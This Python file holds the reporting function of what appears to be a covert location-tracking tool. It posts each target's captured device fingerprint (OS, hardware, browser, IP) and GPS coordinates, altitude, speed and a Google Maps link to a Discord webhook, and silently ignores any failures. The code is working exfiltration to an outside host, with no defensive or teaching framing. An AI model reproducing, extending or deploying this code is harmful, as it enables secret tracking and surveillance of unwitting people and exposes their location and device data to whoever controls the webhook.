#!/usr/bin/env python3
import json
import requests
from datetime import datetime


def discord_sender(webhook_url, msg_type, content):
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    if msg_type == 'device_info':
        embed = {
            'title': 'Device Information Captured',
            'color': 3447003,
            'timestamp': timestamp,
            'fields': [
                {'name': 'OS', 'value': str(content.get('os', 'N/A')), 'inline': True},
                {'name': 'Platform', 'value': str(content.get('platform', 'N/A')), 'inline': True},
                {'name': 'CPU Cores', 'value': str(content.get('cores', 'N/A')), 'inline': True},
                {'name': 'RAM', 'value': str(content.get('ram', 'N/A')), 'inline': True},
                {'name': 'GPU Vendor', 'value': str(content.get('vendor', 'N/A')), 'inline': True},
                {'name': 'GPU Renderer', 'value': str(content.get('render', 'N/A')), 'inline': True},
                {'name': 'Browser', 'value': str(content.get('browser', 'N/A')), 'inline': True},
                {'name': 'IP', 'value': str(content.get('ip', 'N/A')), 'inline': True},
                {'name': 'Session ID', 'value': str(content.get('sid', 'N/A')), 'inline': True},
            ],
        }
        payload = {'embeds': [embed]}

    elif msg_type == 'location':
        embed = {
            'title': 'GPS Location Captured',
            'color': 5763719,
            'timestamp': timestamp,
            'fields': [
                {'name': 'Latitude', 'value': str(content.get('lat', 'N/A')), 'inline': True},
                {'name': 'Longitude', 'value': str(content.get('lon', 'N/A')), 'inline': True},
                {'name': 'Accuracy', 'value': str(content.get('acc', 'N/A')), 'inline': True},
                {'name': 'Altitude', 'value': str(content.get('alt', 'N/A')), 'inline': True},
                {'name': 'Speed', 'value': str(content.get('spd', 'N/A')), 'inline': True},
                {'name': 'Session ID', 'value': str(content.get('sid', 'N/A')), 'inline': True},
            ],
        }
        payload = {'embeds': [embed]}

    elif msg_type == 'url':
        embed = {
            'title': 'Google Maps Link',
            'color': 16761600,
            'timestamp': timestamp,
            'fields': [
                {'name': 'URL', 'value': str(content.get('url', 'N/A'))},
                {'name': 'Session ID', 'value': str(content.get('sid', 'N/A'))},
            ],
        }
        payload = {'embeds': [embed]}

    elif msg_type == 'error':
        embed = {
            'title': 'Location Error',
            'color': 15158332,
            'timestamp': timestamp,
            'fields': [
                {'name': 'Error', 'value': str(content.get('error', 'Unknown'))},
                {'name': 'Session ID', 'value': str(content.get('sid', 'N/A'))},
            ],
        }
        payload = {'embeds': [embed]}

    else:
        payload = {
            'content': f'**{msg_type}**\n```json\n{json.dumps(content, indent=2)}\n```'
        }

    try:
        requests.post(webhook_url, json=payload, timeout=10)
    except Exception:
        pass
